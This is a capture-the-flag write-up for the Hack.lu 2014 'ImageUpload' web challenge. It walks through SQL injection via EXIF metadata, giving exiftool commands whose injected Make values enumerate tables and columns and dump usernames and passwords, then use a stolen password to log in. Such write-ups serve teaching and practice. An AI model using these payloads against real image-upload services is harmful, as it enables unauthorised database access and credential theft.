# Hack.lu CTF 2014: ImageUpload

**Category:** Web
**Points:** 200
**Author:** SLAZ
**Description:**

> In the Wild Wild Web, there are really bad guys. The sheriff doesn’t know them all. Therefore, he needs your help.
Upload pictures of criminals to this [site](https://wildwildweb.fluxfingers.net:1421/) and help the sheriff to arrest them.
You can make this Wild Wild Web much less wild!!!
>
> Pictures will be deleted on regular basis!
>
> **Hint:** Bruteforce is not necessary to solve the challenge!!! Please don’t do this.

## Write-up

As stated in the challenge description, the site at <https://wildwildweb.fluxfingers.net:1421/> allows image uploads. There is also a login form, but since we don’t have an account, let’s ignore that for now.

Some trial and error reveals that only JPEGs are accepted. Any image you upload gets some effects applied to it to make it look like a Wild Western ‘Wanted’ poster:

![](poster.jpg)

The text on the image “Dr. Evil” reflects the original image’s `Artist` EXIF tag. Below the image, the original `Width`, `Height`, `Author` (i.e. `Artist`), `Manufacturer` (i.e. `Make`), and `Model` EXIF tags are shown. Let’s inject some interesting values there:

```bash
$ exiftool -Make="foo', (SELECT VERSION())) -- -" image.jpg
```

Uploading this image lists the `Manufacturer` as `foo`, and uses the result of `SELECT VERSION()` as the next value in the query, i.e. as if it was the value for `Model`. Yep, the app is vulnerable to SQL injection through EXIF data.

Let’s find out which tables exist in the current database:

```bash
$ exiftool -Make="foo', (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE())) -- -" image.jpg
```

The result is `brute,pictures,users`. Hmm, what are the names of the columns in the `users` table?

```bash
$ exiftool -Make="foo', (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users')) -- -" image.jpg
```

Apparently, `id,name,password`. Those `name` and `password` columns sound interesting – let’s see what values are in there:

```bash
$ exiftool -Make="foo', (SELECT GROUP_CONCAT(CONCAT(name, ':', password)) FROM users)) -- -" image.jpg
```

The result: `sheriff:AO7eikkOCucCFJOyyaaQ,deputy:testpw`.

Logging in using `sheriff` as the username and `AO7eikkOCucCFJOyyaaQ` as the password reveals the flag `flag{1\_5h07\_7h3\_5h3r1ff}`.

## Other write-ups and resources

* <http://akaminsky.net/hack-lu-ctf-2014-web-200-imageupload/>
* <http://www.mrt-prodz.com/blog/view/2014/10/hacklu-ctf-2014---imageupload-200pts-writeup/>
* [Writeup by captchaflag](http://www.captchaflag.com/blog/2014/10/24/hack-dot-lu-2014-imageupload/)
* [German](https://f00l.de/blog/hack-lu-ctf-2014-imageupload/)
